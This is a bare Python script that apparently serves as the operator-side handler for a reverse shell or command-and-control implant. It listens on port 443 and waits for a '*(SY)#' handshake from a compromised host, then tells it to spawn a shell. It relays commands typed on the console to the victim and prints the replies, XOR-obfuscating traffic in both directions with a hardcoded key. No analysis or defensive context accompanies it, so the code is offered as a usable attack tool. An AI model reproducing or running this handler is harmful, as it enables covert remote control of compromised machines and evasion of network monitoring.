#!/usr/bin/python
import socket
import sys

key = [3, 7, 15, 31, 63, 127, 255, 255, 255, 255, 255, 255, 254, 253, 251, 247, 238, 220, 185, 115, 231, 207, 158, 61, 123, 247, 238, 220, 184, 112, 224, 192, 128, 0, 0, 1, 3, 6, 13, 26, 53, 107, 214, 173, 90, 180, 104, 209, 163, 70, 141, 27, 54, 108, 217, 179, 103, 206, 156, 56, 113, 227, 198, 141, 26, 53, 106, 213, 170, 85, 171, 86, 173, 91, 182, 108, 216, 176, 97, 195, 135, 14, 28, 56, 113, 227, 198, 140, 24, 48, 97, 194, 132, 8, 16, 32, 65, 130, 4, 9, 19, 39, 79, 158, 61, 122, 244, 233, 210, 165, 74, 149, 43, 87, 175, 95, 191, 127, 255, 255, 254, 252, 248, 241, 226, 196, 137, 18, 36, 73, 147, 39, 78, 156, 57, 114, 229, 203, 151, 47, 95, 191, 126, 252, 248, 240, 224, 193, 131, 7, 14, 28, 57, 114, 228, 201, 147, 38, 77, 155, 55, 110, 221, 186, 117, 234, 212, 169, 82, 165, 75, 150, 44, 88, 176, 97, 195, 135, 14, 28, 57, 114, 228, 201, 146, 37, 75, 151, 46, 93, 187, 119, 239, 222, 188, 121, 243, 230, 205, 155, 55, 111, 223, 191, 126, 253, 251, 247, 239, 223, 190, 124, 249, 243, 231, 207, 158, 60, 121, 242, 229, 202, 148, 40, 81, 162, 69, 139, 23, 47, 94, 188, 121, 243, 230, 205, 155, 54, 109, 218, 181, 107, 215, 175, 95, 191, 126, 252, 248, 240, 225, 195, 134, 12, 24, 48, 97, 195, 134, 13, 27, 55, 111, 222, 188, 120, 241, 227, 198, 141, 26, 53, 107, 214, 172, 89, 179, 103, 206, 156, 57, 114, 229, 202, 149, 43, 86, 172, 89, 178, 101, 202, 149, 42, 84, 169, 83, 166, 76, 152, 49, 98, 196, 136, 16, 33, 67, 134, 13, 27, 55, 110, 221, 187, 118, 236, 216, 177, 98, 196, 136, 16, 32, 64, 128, 0, 1, 3, 6, 12, 25, 51, 102, 205, 155, 55, 111, 222, 188, 121, 242, 228, 200, 144, 32, 64, 129, 2, 4, 9, 19, 39, 78, 157, 59, 118, 237, 219, 182, 108, 216, 177, 98, 197, 138, 20, 41, 82, 164, 72, 144, 33, 66, 133, 11, 22, 45, 90, 180, 105, 210, 164, 72, 144, 32, 64, 128, 0, 0, 1, 3, 7, 15, 31, 63, 127, 255, 255, 254, 252, 248, 241, 227, 198, 141, 26, 52, 104, 209, 163, 70, 140, 24, 48, 96, 192, 129, 2, 5, 11, 23, 47, 95, 190, 124, 248, 240, 225, 195, 135, 14, 29, 59, 118, 237, 219, 182, 109, 219, 182, 109, 218, 181, 106, 212, 168, 81, 163, 71, 143, 31, 63, 126, 252, 249, 243, 231, 206, 156, 56, 113, 226, 197, 139, 23, 46, 92, 184, 113, 226, 197, 139, 22, 44, 88, 176, 96, 192, 128, 1, 2, 4, 8, 16, 32, 64, 128, 1, 2, 5, 11, 23, 46, 93, 187, 119, 238, 221, 187, 118, 236, 217, 179, 102, 205, 154, 52, 104, 208, 160, 64, 128, 1, 2, 4, 8, 16, 32, 65, 131, 7, 15, 30, 60, 120, 240, 225, 195, 134, 12, 24, 48, 96, 193, 130, 4, 8, 17, 34, 68, 136, 16, 32, 64, 128, 1, 2, 4, 9, 18, 37, 75, 151, 46, 93, 186, 117, 235, 215, 175, 95, 190, 124, 248, 241, 226, 196, 136, 16, 32, 64, 128, 1, 2, 4, 8, 16, 33, 67, 134, 12, 24, 48, 97, 194, 132, 8, 17, 34, 69, 139, 23, 46, 93, 186, 117, 235, 215, 175, 95, 191, 127, 255, 255, 254, 252, 248, 240, 225, 195, 135, 14, 28, 57, 115, 231, 207, 159, 63, 126, 253, 250, 244, 232, 208, 160, 65, 130, 4, 9, 18, 36, 72, 145, 35, 70, 141, 26, 52, 104, 208, 160, 65, 130, 4, 9, 18, 36, 72, 145, 35, 70, 140, 24, 48, 96, 192, 129, 3, 7, 14, 29, 58, 117, 234, 212, 168, 81, 163, 71, 142, 29, 58, 117, 235, 214, 173, 90, 180, 104, 208, 161, 67, 134, 12, 24, 49, 99, 198, 140, 24, 49, 98, 196, 136, 16, 33, 67, 135, 15, 31, 63, 126, 252, 249, 242, 229, 202, 149, 42, 85, 170, 85, 171, 86, 172, 88, 177, 99, 198, 140, 25, 50, 100, 200, 144, 32, 64, 129, 3, 6, 13, 27, 54, 109, 218, 180, 105, 211, 167, 78, 157, 58, 117, 234, 213, 171, 87, 175, 95, 190, 124, 248, 241, 226, 196, 137, 18, 36, 72, 144, 33, 67, 135, 14, 29, 58, 116, 233, 210, 164, 72, 144, 33, 66, 132, 8, 17, 34, 68, 136, 16, 32, 64, 129, 3, 7, 14, 28, 57, 114, 229, 203, 150, 45, 90, 181, 106, 212, 168, 80, 160, 65, 131, 7, 14, 28, 57, 114, 229, 202, 149, 42, 84, 169, 82, 164, 73, 147, 38, 77, 154, 53, 107, 214, 173, 90, 180, 105, 211, 166, 76, 152, 49, 98, 196, 137, 19, 38, 76, 152, 48, 96, 192, 129, 2, 5, 11, 23, 46, 92, 184, 112, 224, 193, 130, 4, 9, 19, 38, 77, 155, 55, 110, 220, 185, 115, 231, 207, 159, 63, 127, 254, 253, 251, 247, 239, 222, 188, 121, 242, 228, 200, 145, 35, 70, 141, 27, 55, 110, 220, 184, 112, 224, 192, 129, 3, 6, 13, 26, 53, 107, 214, 172, 89, 179, 103, 206, 157, 58, 116, 233, 211, 166, 76, 153, 51, 103, 207, 159, 63, 127, 254, 253, 250, 245, 234, 213, 171, 86, 172, 89, 178, 100, 201, 147, 39, 79, 159, 62, 124, 249, 243, 230, 204, 152, 48, 96, 192, 129, 3, 6, 13, 26, 53, 107, 214, 173, 90, 180, 104, 208, 161, 66, 133, 10, 21, 43, 87, 174, 93, 187, 119, 238, 221, 186, 117, 234, 213, 170, 84, 169, 82, 164, 73, 147, 39, 79, 158, 60, 120, 240, 224, 193, 131, 7, 15, 30, 60, 121, 243, 230, 204, 152, 48, 97, 195, 135, 15, 30, 60, 121, 242, 228, 201, 147, 39, 78, 157, 59, 119, 239, 223, 190, 172 ]

def dexor(data):
    i = 0
    for n in range(len(data)-1):
        if i > len(data)-1:
            i = 0
        char = data[n] ^ key[i]
        if char == '\r':
            i += 1
            continue
        sys.stdout.write("%c" % char)
        i += 1

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(("0.0.0.0", 443))
sock.listen()
with sock:
    try:
        c, a = sock.accept()
        sock.setblocking(False)
        print("[+] connection received!")
        with c:
            steps = 0
            data_len = 0
            data = c.recv(1024)

            if data[0:6] == b'*(SY)#':
                print("[!] SY signal received, spawning shell")
                c.sendall(b'*(SY)# cmd')
                
            while True:
                while True:
                    data = c.recv(4)
                    #print("recv:{}\ndata: {}\n".format(len(data), data))
                    
                    data_len = int(data.strip(b'\x00'),10)

                    data = c.recv(data_len)
                    dexor(data)
                    if data_len < 1025:
                        break
                
                s = bytearray()
                for cmd in sys.stdin:
                    #cmd.replace('\n', '\r\n')
                    for n in cmd:
                        s.append(ord(n)^key[len(s)])
                    break
                c.sendall(s)

    except Exception as e:
        print(e)
        pass

